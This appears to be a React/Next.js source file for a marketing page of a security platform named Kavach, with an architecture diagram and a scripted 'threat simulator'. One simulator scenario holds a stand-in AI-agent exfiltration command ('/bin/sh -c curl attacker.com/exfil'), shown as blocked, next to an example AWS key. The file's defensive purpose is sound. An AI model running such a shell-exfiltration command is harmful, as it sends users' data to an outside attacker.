'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  Layers,
  ArrowRight,
  Code2,
  Cloud,
  Cpu,
  Database,
  Lock,
  Eye,
  Server,
  Terminal,
  Activity,
  CheckCircle2,
  GitBranch,
  Boxes,
  Zap,
  Globe,
  Sliders,
  ChevronRight,
  Sparkles,
  Search,
  Bot,
  Play,
  RotateCcw,
  KeyRound,
  FileCode2,
  GitPullRequest,
  Check,
  AlertTriangle,
  Radio,
  FileCheck2,
} from 'lucide-react';
import { SecuLayerHeader } from '@/components/navigation/SecuLayerHeader';
import { SearchModal } from '@/components/common/SearchModal';
import { TalkToExpertModal } from '@/components/common/TalkToExpertModal';
import { KavachMark } from '@/components/common/KavachLogo';

interface SimulationScenario {
  id: string;
  name: string;
  category: 'AI Agent' | 'Code/Secret' | 'Kernel/eBPF' | 'Normal';
  payload: string;
  expectedDecision: 'BLOCKED' | 'ALLOWED';
  evalLatency: string;
  ruleId: string;
  ruleTitle: string;
  enforcingPlane: string;
  evidenceSignature: string;
}

const SCENARIOS: SimulationScenario[] = [
  {
    id: 'ai-agent-shell',
    name: 'AI Agent Shell Execution Attempt',
    category: 'AI Agent',
    payload: 'MCP Tool Request: exec_command("/bin/sh -c curl attacker.com/exfil")',
    expectedDecision: 'BLOCKED',
    evalLatency: '14.2ms',
    ruleId: 'SEC-INV-402',
    ruleTitle: 'AI Agent Zero-Egress Shell Execution Invariant',
    enforcingPlane: 'Plane 2: Deterministic Policy Core (OPA Rego v1.0)',
    evidenceSignature: 'ed25519:7a4f91b2c83d... | Timestamp: 2026-10-29T09:44:12Z',
  },
  {
    id: 'secret-leak-pr',
    name: 'AWS Secret Leaked in Git Commit',
    category: 'Code/Secret',
    payload: 'git commit -m "add config" (contains AKIAIOSFODNN7EXAMPLE)',
    expectedDecision: 'BLOCKED',
    evalLatency: '8.4ms',
    ruleId: 'SEC-SECR-101',
    ruleTitle: 'Pre-Merge High-Entropy Cloud Credential Detection',
    enforcingPlane: 'Plane 4: Code & CI/CD Security Gate (Gitleaks Engine)',
    evidenceSignature: 'ed25519:3b128ef091a4... | Blocked at GitHub webhook gate',
  },
  {
    id: 'kernel-raw-socket',
    name: 'Container Unauthorized Raw Socket Spawn',
    category: 'Kernel/eBPF',
    payload: 'Syscall: socket(AF_INET, SOCK_RAW, IPPROTO_RAW) from pod/payment-api',
    expectedDecision: 'BLOCKED',
    evalLatency: '1.8ms',
    ruleId: 'SEC-EBPF-701',
    ruleTitle: 'Kernel Invariant: Restrict Raw Packet Crafting in User Workloads',
    enforcingPlane: 'Plane 1: eBPF Runtime Probes & Kernel Enclave',
    evidenceSignature: 'ed25519:9f84bc19a77e... | Persisted in PostgreSQL Immutable Ledger',
  },
  {
    id: 'developer-auth-read',
    name: 'Authenticated Developer Config Query',
    category: 'Normal',
    payload: 'GET /api/v1/code/overview (Bearer token with role:developer)',
    expectedDecision: 'ALLOWED',
    evalLatency: '11.5ms',
    ruleId: 'SEC-AUTH-204',
    ruleTitle: 'RBAC Read-Only Workload Visibility Policy',
    enforcingPlane: 'Plane 2: Deterministic Policy Core (OPA Rego v1.0)',
    evidenceSignature: 'ed25519:1e58cb30f81d... | Audit trail entry logged #evt-58190',
  },
];

export default function KavachPlatformPage() {
  const router = useRouter();
  const [searchOpen, setSearchOpen] = useState(false);
  const [expertOpen, setExpertOpen] = useState(false);

  // Active matrix tab: 'matrix' | 'simulator' | 'telemetry'
  const [visualizerTab, setVisualizerTab] = useState<'matrix' | 'simulator' | 'telemetry'>('matrix');
  const [selectedPlane, setSelectedPlane] = useState<'code' | 'mcp' | 'opa' | 'ebpf'>('opa');

  // Interactive Threat Simulator State
  const [activeScenario, setActiveScenario] = useState<SimulationScenario>(SCENARIOS[0]);
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [simStep, setSimStep] = useState<number>(0);
  const [simulationCompleted, setSimulationCompleted] = useState<boolean>(false);

  // Lower section states
  const [activeStage, setActiveStage] = useState<'develop' | 'build' | 'deploy' | 'run' | 'respond'>('build');
  const [activePillar, setActivePillar] = useState<string>('code');

  const runSimulation = () => {
    setIsSimulating(true);
    setSimulationCompleted(false);
    setSimStep(1);

    setTimeout(() => setSimStep(2), 350);
    setTimeout(() => setSimStep(3), 750);
    setTimeout(() => setSimStep(4), 1150);
    setTimeout(() => {
      setIsSimulating(false);
      setSimulationCompleted(true);
    }, 1450);
  };

  const lifecycleStages = [
    {
      id: 'develop',
      name: 'Develop',
      audience: 'Developers',
      icon: <Code2 size={16} />,
      description: 'Pre-commit hooks, IDE integration, secrets blocking, and real-time AST feedback before git push.',
      tools: 'Semgrep SAST, Gitleaks, IDE LSP, Secret Scanning',
    },
    {
      id: 'build',
      name: 'Build',
      audience: 'CI/CD',
      icon: <Terminal size={16} />,
      description: 'Automated CI pipelines, container scanning, SBOM generation, and dependency CVE gating.',
      tools: 'GitHub Actions, GitLab CI, Trivy Container, Syft SBOM',
    },
    {
      id: 'deploy',
      name: 'Deploy',
      audience: 'Cloud & Infra',
      icon: <Cloud size={16} />,
      description: 'Infrastructure as Code validation, cloud drift detection, and automated admission policies.',
      tools: 'Terraform, CloudFormation, Checkov, OPA Rego',
    },
    {
      id: 'run',
      name: 'Run',
      audience: 'Applications',
      icon: <Server size={16} />,
      description: 'eBPF runtime security, container anomaly detection, and zero-trust workload identity.',
      tools: 'eBPF Monitor, Kubernetes Admission, Envoy Proxy',
    },
    {
      id: 'respond',
      name: 'Respond',
      audience: 'SOC / Security',
      icon: <Activity size={16} />,
      description: 'Real-time threat triage, automated containment, forensic evidence capture, and audit logs.',
      tools: 'SIEM Integration, Automated Remediation, Slack/Jira Sync',
    },
  ];

  const pillars = [
    {
      id: 'code',
      title: 'Code Security',
      sub: 'SAST • SCA • Secrets',
      icon: <Code2 size={18} color="#2563EB" />,
      color: '#2563EB',
      bg: '#EFF6FF',
      details: 'Deep static analysis with custom rules, software composition analysis with license checking, and pre-commit secret detection.',
      href: '/code',
    },
    {
      id: 'cloud',
      title: 'Cloud Security',
      sub: 'CSPM • IaC • KSPM',
      icon: <Cloud size={18} color="#059669" />,
      color: '#059669',
      bg: '#ECFDF5',
      details: 'Continuous cloud security posture management across AWS, Azure, GCP, and Kubernetes clusters with CIS benchmark verification.',
      href: '/cloud',
    },
    {
      id: 'runtime',
      title: 'Runtime Security',
      sub: 'Containers • K8s • Serverless',
      icon: <Server size={18} color="#7C3AED" />,
      color: '#7C3AED',
      bg: '#F5F3FF',
      details: 'eBPF-driven runtime threat detection and automated behavioral anomaly defense for microservices and cloud workloads.',
      href: '/protect',
    },
    {
      id: 'data',
      title: 'Data Security',
      sub: 'Data Protection • DSPM',
      icon: <Database size={18} color="#D97706" />,
      color: '#D97706',
      bg: '#FFFBEB',
      details: 'Data security posture management, sensitive PII/credential classification, and cryptographic access enforcement.',
      href: '/data',
    },
    {
      id: 'ai',
      title: 'AI Security',
      sub: 'AI SPM • LLM Security',
      icon: <Cpu size={18} color="#DC2626" />,
      color: '#DC2626',
      bg: '#FEF2F2',
      details: 'Security gateways for AI coding agents, prompt injection filtering, tool permission boundaries, and audit logging.',
      href: '/agent',
    },
  ];

  const dataLayerConnectors = [
    { name: 'Repositories', count: '14 Connected' },
    { name: 'Cloud Providers', count: 'AWS, GCP, Azure' },
    { name: 'Kubernetes', count: '3 Clusters' },
    { name: 'CI/CD Tools', count: 'GitHub, GitLab' },
    { name: 'Databases', count: 'PostgreSQL, RDS' },
    { name: 'Identity Providers', count: 'Okta, IAM' },
    { name: 'SaaS Integrations', count: 'Slack, Jira' },
    { name: 'Private Enclave', count: 'Zero Egress' },
  ];

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#FFFFFF', display: 'flex', flexDirection: 'column' }}>
      {/* Skip to Main Content Link */}
      <a
        href="#architecture-matrix"
        style={{
          position: 'absolute',
          left: '-9999px',
          top: '12px',
          zIndex: 9999,
          padding: '8px 16px',
          backgroundColor: '#0F172A',
          color: '#FFFFFF',
          borderRadius: '6px',
          fontWeight: 600,
          fontSize: '13px',
          textDecoration: 'none',
        }}
        onFocus={(e) => {
          e.currentTarget.style.left = '16px';
        }}
        onBlur={(e) => {
          e.currentTarget.style.left = '-9999px';
        }}
      >
        Skip to main content
      </a>

      {/* Top Header */}
      <SecuLayerHeader
        onOpenSearch={() => setSearchOpen(true)}
        onOpenExpert={() => setExpertOpen(true)}
      />

      {/* Main Platform Hero */}
      <main style={{ flex: 1, padding: '48px 24px 80px', maxWidth: '1400px', margin: '0 auto', width: '100%' }}>
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: 'minmax(0, 1.05fr) minmax(0, 1.35fr)',
            gap: '48px',
            alignItems: 'start',
          }}
          className="platform-hero-grid"
        >
          {/* ========================================================= */}
          {/* HERO LEFT: High-Contrast Proposition & Trust Badges */}
          {/* ========================================================= */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '8px' }}>
            {/* Status Pill */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <div
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '5px 14px',
                  borderRadius: '9999px',
                  backgroundColor: '#EFF6FF',
                  border: '1px solid #BFDBFE',
                  color: '#2563EB',
                  fontSize: '11px',
                  fontWeight: 700,
                  letterSpacing: '0.06em',
                  textTransform: 'uppercase',
                }}
              >
                <div
                  style={{
                    width: '7px',
                    height: '7px',
                    borderRadius: '50%',
                    backgroundColor: '#16A34A',
                    boxShadow: '0 0 0 2.5px rgba(34, 197, 94, 0.25)',
                  }}
                />
                <span>KAVACH AUTONOMOUS DEFENSE PLATFORM</span>
              </div>
            </div>

            {/* Headline */}
            <h1
              style={{
                fontSize: '44px',
                fontWeight: 800,
                color: '#0F172A',
                letterSpacing: '-0.035em',
                lineHeight: 1.14,
                margin: 0,
                fontFamily: "var(--font-sans, 'Plus Jakarta Sans', -apple-system, sans-serif)",
              }}
            >
              A unified security platform for modern infrastructure.
            </h1>

            {/* Subtitle */}
            <p
              style={{
                fontSize: '16px',
                color: '#475569',
                lineHeight: 1.65,
                margin: 0,
                maxWidth: '540px',
              }}
            >
              Kavach unifies code, cloud, runtime, identity, data, and autonomous AI agent security into a single deterministic control plane. Zero LLM authority, sub-20ms policy enforcement, and tamper-evident cryptographic evidence across your entire stack.
            </p>

            {/* 3 Core Architecture Invariant Pills */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginTop: '4px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#1E293B' }}>
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', backgroundColor: '#ECFDF5', color: '#059669', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                  <Check size={13} strokeWidth={3} />
                </div>
                <span><strong>Zero LLM Security Authority:</strong> Deterministic policy engines (OPA) make all final ALLOW/BLOCK decisions.</span>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#1E293B' }}>
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', backgroundColor: '#EFF6FF', color: '#2563EB', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                  <Check size={13} strokeWidth={3} />
                </div>
                <span><strong>Sub-20ms Policy Decisions:</strong> Compiled Rego v1.0 rules evaluate runtime syscalls and PR gates at wire speed.</span>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#1E293B' }}>
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', backgroundColor: '#F5F3FF', color: '#7C3AED', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                  <Check size={13} strokeWidth={3} />
                </div>
                <span><strong>Tamper-Evident Evidence:</strong> Every action is cryptographically signed and recorded in PostgreSQL.</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '14px', flexWrap: 'wrap', marginTop: '8px' }}>
              <Link
                href="/code"
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '12px 24px',
                  borderRadius: '8px',
                  backgroundColor: '#2563EB',
                  color: '#FFFFFF',
                  fontWeight: 600,
                  fontSize: '14px',
                  textDecoration: 'none',
                  boxShadow: '0 2px 6px rgba(37, 99, 235, 0.3)',
                  transition: 'background-color 0.15s ease',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#1D4ED8')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#2563EB')}
              >
                <span>Explore Platform</span>
                <ArrowRight size={16} />
              </Link>

              <button
                type="button"
                onClick={() => {
                  setVisualizerTab('simulator');
                  const el = document.getElementById('architecture-matrix');
                  if (el) el.scrollIntoView({ behavior: 'smooth' });
                  runSimulation();
                }}
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: '8px',
                  padding: '12px 22px',
                  borderRadius: '8px',
                  backgroundColor: '#FFFFFF',
                  border: '1px solid #CBD5E1',
                  color: '#0F172A',
                  fontWeight: 600,
                  fontSize: '14px',
                  cursor: 'pointer',
                  transition: 'background-color 0.15s ease',
                }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#F8FAFC')}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#FFFFFF')}
              >
                <Zap size={15} color="#2563EB" />
                <span>Simulate Threat Invariant</span>
              </button>
            </div>
          </div>

          {/* ========================================================= */}
          {/* HERO RIGHT: UNIQUE INTERACTIVE DEFENSE MATRIX (NO 3D) */}
          {/* ========================================================= */}
          <div
            id="architecture-matrix"
            style={{
              backgroundColor: '#FFFFFF',
              borderRadius: '16px',
              border: '1px solid #E2E8F0',
              padding: '24px',
              boxShadow: '0 20px 30px -10px rgba(15, 23, 42, 0.07), 0 4px 6px -2px rgba(15, 23, 42, 0.03)',
              display: 'flex',
              flexDirection: 'column',
              gap: '20px',
            }}
          >
            {/* Visualizer Top Control Bar */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <KavachMark size={24} />
                <div>
                  <div style={{ fontSize: '13px', fontWeight: 800, color: '#0F172A', letterSpacing: '-0.02em', textTransform: 'uppercase' }}>
                    Kavach Deterministic Control Plane
                  </div>
                  <div style={{ fontSize: '11px', color: '#64748B' }}>
                    4-Plane Multi-Layer Security Verification Matrix
                  </div>
                </div>
              </div>

              {/* 3 View Tabs: Matrix, Simulator, Telemetry */}
              <div style={{ display: 'flex', backgroundColor: '#F1F5F9', padding: '3px', borderRadius: '8px', border: '1px solid #E2E8F0' }}>
                <button
                  type="button"
                  onClick={() => setVisualizerTab('matrix')}
                  style={{
                    padding: '5px 12px',
                    fontSize: '11px',
                    fontWeight: 600,
                    borderRadius: '6px',
                    border: 'none',
                    backgroundColor: visualizerTab === 'matrix' ? '#FFFFFF' : 'transparent',
                    color: visualizerTab === 'matrix' ? '#0F172A' : '#64748B',
                    boxShadow: visualizerTab === 'matrix' ? '0 1px 2px rgba(0,0,0,0.06)' : 'none',
                    cursor: 'pointer',
                  }}
                >
                  Architecture Stack
                </button>
                <button
                  type="button"
                  onClick={() => setVisualizerTab('simulator')}
                  style={{
                    padding: '5px 12px',
                    fontSize: '11px',
                    fontWeight: 600,
                    borderRadius: '6px',
                    border: 'none',
                    backgroundColor: visualizerTab === 'simulator' ? '#FFFFFF' : 'transparent',
                    color: visualizerTab === 'simulator' ? '#2563EB' : '#64748B',
                    boxShadow: visualizerTab === 'simulator' ? '0 1px 2px rgba(0,0,0,0.06)' : 'none',
                    cursor: 'pointer',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '4px',
                  }}
                >
                  <Zap size={12} />
                  <span>Threat Simulator</span>
                </button>
                <button
                  type="button"
                  onClick={() => setVisualizerTab('telemetry')}
                  style={{
                    padding: '5px 12px',
                    fontSize: '11px',
                    fontWeight: 600,
                    borderRadius: '6px',
                    border: 'none',
                    backgroundColor: visualizerTab === 'telemetry' ? '#FFFFFF' : 'transparent',
                    color: visualizerTab === 'telemetry' ? '#0F172A' : '#64748B',
                    boxShadow: visualizerTab === 'telemetry' ? '0 1px 2px rgba(0,0,0,0.06)' : 'none',
                    cursor: 'pointer',
                  }}
                >
                  Live Telemetry
                </button>
              </div>
            </div>

            {/* ========================================================= */}
            {/* TAB 1: ARCHITECTURE STACK (Flat, Crisp, High-Tech Cards) */}
            {/* ========================================================= */}
            {visualizerTab === 'matrix' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                {/* Plane 4: Code & CI/CD */}
                <div
                  onClick={() => setSelectedPlane('code')}
                  style={{
                    padding: '14px 18px',
                    borderRadius: '10px',
                    border: selectedPlane === 'code' ? '2px solid #2563EB' : '1px solid #E2E8F0',
                    backgroundColor: selectedPlane === 'code' ? '#EFF6FF' : '#F8FAFC',
                    cursor: 'pointer',
                    transition: 'all 0.15s ease',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <FileCode2 size={16} color="#2563EB" />
                      <span style={{ fontSize: '13px', fontWeight: 700, color: '#0F172A' }}>
                        Plane 4 · Code &amp; Supply Chain Surface
                      </span>
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 700, color: '#2563EB', backgroundColor: '#DBEAFE', padding: '2px 8px', borderRadius: '4px' }}>
                      PRE-MERGE GATE
                    </span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '11.5px', color: '#475569', flexWrap: 'wrap' }}>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Semgrep SAST (AST)</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Gitleaks Secrets</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>CycloneDX SBOM</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>PR Security Review</span>
                  </div>
                </div>

                {/* Connecting Bus */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '14px' }}>
                  <div style={{ width: '2px', height: '14px', backgroundColor: '#CBD5E1' }} />
                </div>

                {/* Plane 3: AI Agents & MCP Gateway */}
                <div
                  onClick={() => setSelectedPlane('mcp')}
                  style={{
                    padding: '14px 18px',
                    borderRadius: '10px',
                    border: selectedPlane === 'mcp' ? '2px solid #7C3AED' : '1px solid #E2E8F0',
                    backgroundColor: selectedPlane === 'mcp' ? '#FAF5FF' : '#F8FAFC',
                    cursor: 'pointer',
                    transition: 'all 0.15s ease',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Bot size={16} color="#7C3AED" />
                      <span style={{ fontSize: '13px', fontWeight: 700, color: '#0F172A' }}>
                        Plane 3 · AI Agents &amp; MCP Security Gateway
                      </span>
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 700, color: '#7C3AED', backgroundColor: '#F3E8FF', padding: '2px 8px', borderRadius: '4px' }}>
                      SANDBOXED MCP
                    </span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '11.5px', color: '#475569', flexWrap: 'wrap' }}>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>JSON-RPC Gateway</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>mTLS Identity Tokens</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Tool Access Boundary</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Context Sanitization</span>
                  </div>
                </div>

                {/* Connecting Bus */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '14px' }}>
                  <div style={{ width: '2px', height: '14px', backgroundColor: '#CBD5E1' }} />
                </div>

                {/* Plane 2: Deterministic Policy Core (OPA Engine) */}
                <div
                  onClick={() => setSelectedPlane('opa')}
                  style={{
                    padding: '16px 18px',
                    borderRadius: '10px',
                    border: selectedPlane === 'opa' ? '2.5px solid #0F172A' : '1px solid #CBD5E1',
                    backgroundColor: selectedPlane === 'opa' ? '#F8FAFC' : '#FFFFFF',
                    cursor: 'pointer',
                    boxShadow: '0 4px 12px rgba(15, 23, 42, 0.05)',
                    transition: 'all 0.15s ease',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <ShieldCheck size={18} color="#0F172A" />
                      <span style={{ fontSize: '14px', fontWeight: 800, color: '#0F172A' }}>
                        Plane 2 · Deterministic Policy Core (OPA Rego v1.0)
                      </span>
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 800, color: '#FFFFFF', backgroundColor: '#0F172A', padding: '2px 8px', borderRadius: '4px' }}>
                      AUTHORITATIVE &lt;20MS SLA
                    </span>
                  </div>
                  <div style={{ fontSize: '12px', color: '#334155', lineHeight: 1.4, marginBottom: '8px' }}>
                    <strong>Golden Rule:</strong> LLM models investigate and propose fixes; deterministic OPA rules make authoritative ALLOW/BLOCK determinations.
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '11px', color: '#0F172A', fontWeight: 600 }}>
                    <span style={{ backgroundColor: '#F1F5F9', padding: '2px 6px', borderRadius: '4px' }}>Declarative Rego Rules</span>
                    <span style={{ backgroundColor: '#F1F5F9', padding: '2px 6px', borderRadius: '4px' }}>Zero LLM Authority</span>
                    <span style={{ backgroundColor: '#F1F5F9', padding: '2px 6px', borderRadius: '4px' }}>Ed25519 Signer</span>
                  </div>
                </div>

                {/* Connecting Bus */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '14px' }}>
                  <div style={{ width: '2px', height: '14px', backgroundColor: '#CBD5E1' }} />
                </div>

                {/* Plane 1: eBPF Runtime & Cryptographic Ledger */}
                <div
                  onClick={() => setSelectedPlane('ebpf')}
                  style={{
                    padding: '14px 18px',
                    borderRadius: '10px',
                    border: selectedPlane === 'ebpf' ? '2px solid #059669' : '1px solid #E2E8F0',
                    backgroundColor: selectedPlane === 'ebpf' ? '#ECFDF5' : '#F8FAFC',
                    cursor: 'pointer',
                    transition: 'all 0.15s ease',
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Server size={16} color="#059669" />
                      <span style={{ fontSize: '13px', fontWeight: 700, color: '#0F172A' }}>
                        Plane 1 · eBPF Runtime &amp; Evidence Ledger
                      </span>
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 700, color: '#059669', backgroundColor: '#D1FAE5', padding: '2px 8px', borderRadius: '4px' }}>
                      POSTGRESQL AUDIT LEDGER
                    </span>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '11.5px', color: '#475569', flexWrap: 'wrap' }}>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Kernel Syscall Probes</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>K8s Admission Webhook</span>
                    <span style={{ backgroundColor: '#FFFFFF', padding: '2px 6px', borderRadius: '4px', border: '1px solid #CBD5E1' }}>Immutable Audit Chain</span>
                  </div>
                </div>

                {/* Dynamic Inspector Strip for Selected Plane */}
                <div style={{ marginTop: '6px', padding: '12px 16px', borderRadius: '8px', backgroundColor: '#F8FAFC', border: '1px solid #E2E8F0', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '12px', flexWrap: 'wrap' }}>
                  <div style={{ fontSize: '12px', color: '#334155', flex: 1 }}>
                    {selectedPlane === 'code' && (
                      <span><strong>Plane 4 Status:</strong> AST parser scans pull requests, detects hardcoded secrets with Gitleaks, and checks CVEs against the National Vulnerability Database.</span>
                    )}
                    {selectedPlane === 'mcp' && (
                      <span><strong>Plane 3 Status:</strong> Model Context Protocol proxy binds agent session tokens, restricts filesystem access, and prevents prompt-injection exfiltration.</span>
                    )}
                    {selectedPlane === 'opa' && (
                      <span><strong>Plane 2 Status:</strong> Authoritative Open Policy Agent engine evaluates declarative Rego invariants in under 20ms with cryptographic sign-off.</span>
                    )}
                    {selectedPlane === 'ebpf' && (
                      <span><strong>Plane 1 Status:</strong> Kernel-level eBPF probes intercept untrusted container syscalls and log verifiable tamper-evident hashes into PostgreSQL.</span>
                    )}
                  </div>
                  <Link
                    href={selectedPlane === 'code' ? '/code' : selectedPlane === 'mcp' ? '/agent' : selectedPlane === 'opa' ? '/governance' : '/protect'}
                    style={{ fontSize: '12px', fontWeight: 700, color: '#2563EB', display: 'flex', alignItems: 'center', gap: '4px', textDecoration: 'none' }}
                  >
                    <span>Inspect Invariants →</span>
                  </Link>
                </div>
              </div>
            )}

            {/* ========================================================= */}
            {/* TAB 2: INTERACTIVE THREAT SIMULATOR */}
            {/* ========================================================= */}
            {visualizerTab === 'simulator' && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ fontSize: '13px', color: '#475569', lineHeight: 1.5 }}>
                  Select an attack vector or workload scenario to test Kavach&apos;s deterministic multi-plane policy evaluation:
                </div>

                {/* Scenario Grid */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: '10px' }}>
                  {SCENARIOS.map((sc) => {
                    const isSelected = activeScenario.id === sc.id;
                    return (
                      <div
                        key={sc.id}
                        onClick={() => {
                          setActiveScenario(sc);
                          setSimulationCompleted(false);
                          setSimStep(0);
                        }}
                        style={{
                          padding: '12px 14px',
                          borderRadius: '8px',
                          border: isSelected ? '2px solid #2563EB' : '1px solid #E2E8F0',
                          backgroundColor: isSelected ? '#EFF6FF' : '#FFFFFF',
                          cursor: 'pointer',
                          transition: 'all 0.15s ease',
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '4px' }}>
                          <span style={{ fontSize: '11px', fontWeight: 700, color: sc.expectedDecision === 'BLOCKED' ? '#DC2626' : '#16A34A', textTransform: 'uppercase' }}>
                            {sc.category}
                          </span>
                          <span style={{ fontSize: '10px', color: '#64748B' }}>{sc.evalLatency}</span>
                        </div>
                        <div style={{ fontSize: '12.5px', fontWeight: 700, color: '#0F172A' }}>
                          {sc.name}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Trigger Button & Status Stepper */}
                <div style={{ padding: '16px', borderRadius: '10px', backgroundColor: '#F8FAFC', border: '1px solid #E2E8F0', display: 'flex', flexDirection: 'column', gap: '14px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px' }}>
                    <div style={{ display: 'flex', flexDirection: 'column' }}>
                      <span style={{ fontSize: '12px', fontWeight: 600, color: '#0F172A' }}>
                        Simulating Payload:
                      </span>
                      <span style={{ fontFamily: 'ui-monospace, monospace', fontSize: '11.5px', color: '#2563EB', wordBreak: 'break-all' }}>
                        {activeScenario.payload}
                      </span>
                    </div>

                    <button
                      type="button"
                      onClick={runSimulation}
                      disabled={isSimulating}
                      style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px',
                        padding: '9px 18px',
                        borderRadius: '6px',
                        backgroundColor: '#0F172A',
                        color: '#FFFFFF',
                        fontSize: '13px',
                        fontWeight: 600,
                        border: 'none',
                        cursor: isSimulating ? 'not-allowed' : 'pointer',
                        boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
                      }}
                    >
                      <Play size={14} fill="#FFFFFF" />
                      <span>{isSimulating ? 'Evaluating Invariants...' : 'Run Verification Test'}</span>
                    </button>
                  </div>

                  {/* 4-Step Animated Evaluation Pipeline */}
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '8px', marginTop: '6px' }}>
                    <div style={{ padding: '8px 10px', borderRadius: '6px', backgroundColor: simStep >= 1 ? '#EFF6FF' : '#FFFFFF', border: `1px solid ${simStep >= 1 ? '#93C5FD' : '#E2E8F0'}`, textAlign: 'center' }}>
                      <div style={{ fontSize: '10px', color: '#64748B' }}>Step 1</div>
                      <div style={{ fontSize: '11px', fontWeight: 700, color: simStep >= 1 ? '#1E40AF' : '#94A3B8' }}>CI / MCP Ingest</div>
                    </div>
                    <div style={{ padding: '8px 10px', borderRadius: '6px', backgroundColor: simStep >= 2 ? '#FAF5FF' : '#FFFFFF', border: `1px solid ${simStep >= 2 ? '#D8B4FE' : '#E2E8F0'}`, textAlign: 'center' }}>
                      <div style={{ fontSize: '10px', color: '#64748B' }}>Step 2</div>
                      <div style={{ fontSize: '11px', fontWeight: 700, color: simStep >= 2 ? '#6B21A8' : '#94A3B8' }}>Identity Tokens</div>
                    </div>
